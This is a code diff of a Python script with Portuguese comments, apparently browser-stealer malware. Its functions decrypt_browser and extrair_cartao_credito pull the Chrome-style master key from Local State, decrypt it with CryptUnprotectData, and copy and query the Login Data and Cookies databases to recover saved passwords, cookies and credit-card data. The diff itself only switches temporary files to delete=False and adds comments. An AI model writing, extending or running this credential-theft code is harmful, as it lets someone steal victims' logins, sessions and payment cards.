@@ -163,7 +163,8 @@ def decrypt_browser(LocalState, LoginData, CookiesFile, name):
                 master_key = b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                 master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
 
-                with tempfile.NamedTemporaryFile(delete=True) as temp_login:
+                # Criação do arquivo temporário para Login Data
+                with tempfile.NamedTemporaryFile(delete=False) as temp_login:
                     if os.path.exists(LoginData):
                         copy2(LoginData, temp_login.name)
                         with connect(temp_login.name) as conn:
@@ -184,7 +185,8 @@ def decrypt_browser(LocalState, LoginData, CookiesFile, name):
                                     message += f"Erro ao descriptografar login para {logins[0]}: {str(e)}\n"
                                     continue
 
-                with tempfile.NamedTemporaryFile(delete=True) as temp_cookie:
+                # Criação do arquivo temporário para Cookies
+                with tempfile.NamedTemporaryFile(delete=False) as temp_cookie:
                     if os.path.exists(CookiesFile):
                         copy2(CookiesFile, temp_cookie.name)
                         with connect(temp_cookie.name) as conn:
@@ -225,8 +227,9 @@ def extrair_cartao_credito(LocalState, LoginData, browser_name):
                 master_key = b64decode(encrypted_key)[5:]
                 master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
 
-                if os.path.exists(LoginData):
-                    with tempfile.NamedTemporaryFile(delete=True) as temp_card:
+                # Criação do arquivo temporário para o Login Data
+                with tempfile.NamedTemporaryFile(delete=False) as temp_card:
+                    if os.path.exists(LoginData):
                         copy2(LoginData, temp_card.name)
                         with connect(temp_card.name) as conn:
                             cur = conn.cursor()
